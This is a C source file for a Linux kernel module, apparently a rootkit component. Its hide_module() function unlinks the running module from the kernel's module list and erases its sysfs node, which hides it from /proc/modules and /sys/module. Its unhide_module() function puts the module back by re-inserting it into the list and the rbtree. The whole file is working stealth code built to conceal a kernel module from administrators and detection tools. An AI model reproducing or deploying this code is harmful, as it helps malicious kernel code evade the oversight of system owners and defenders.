#include <linux/kernfs.h>
#include <linux/module.h>
#include <linux/rbtree.h>
#include <linux/list.h>
#include <linux/hash.h>

#include "common.h"
#include "modhide.h"

static struct list_head *mod;

// https://elixir.bootlin.com/linux/v4.19/source/include/linux/module.h#L334
// https://elixir.bootlin.com/linux/v4.19/source/include/linux/kobject.h#L71
void
hide_module(void)
{
    struct kernfs_node *sd;

    if (mod)
        return;

    mod = THIS_MODULE->list.prev;

    // sysfs directory entry
    sd = THIS_MODULE->mkobj.kobj.sd;

    // Remove from the rbtree of modules (/sys/module/)
    rb_erase(&sd->rb, &sd->parent->dir.children);

    // Remove from the list of modules (/proc/modules)
    list_del(&THIS_MODULE->list);
}

// https://elixir.bootlin.com/linux/v4.19/source/include/linux/module.h#L334
// https://elixir.bootlin.com/linux/v4.19/source/include/linux/kobject.h#L71
void
unhide_module(void)
{
    struct kernfs_node *sd;
    struct rb_root *root;
    struct rb_node *parent;
    struct rb_node **new;

    if (!mod)
        return;

    sd = THIS_MODULE->mkobj.kobj.sd;
    root = &sd->parent->dir.children;
    new = &root->rb_node;
    parent = NULL;

    // Add back to the list of modules (/proc/modules)
    list_add(&THIS_MODULE->list, mod);

    { // Insert our module back into the rbtree of modules (/sys/module/)
        // Search for the place to insert, insert, then rebalance tree,
        // as per https://www.kernel.org/doc/Documentation/rbtree.txt
        while (*new) {
            int cmp;
            struct kernfs_node *rb;

            parent = *new;
            rb = rb_entry(*new, struct kernfs_node, rb);

            // https://elixir.bootlin.com/linux/v4.19/source/fs/kernfs/dir.c#L314
            // Recurse toward insert position based on 1. hash,
            // 2. (upon collision) namespace, and 3. (otherwise) name
            cmp = (sd->hash == rb->hash)
                ? ((sd->ns == rb->ns)
                    ? strcmp(sd->name, rb->name)
                    : sd->ns - rb->ns)
                : sd->hash - rb->hash;

            if (cmp < 0)
                new = &((*new)->rb_left);
            else if (cmp > 0)
                new = &((*new)->rb_right);
            else
                return;
        }

        rb_link_node(&sd->rb, parent, new);
        rb_insert_color(&sd->rb, root);
    }

    mod = NULL;
}
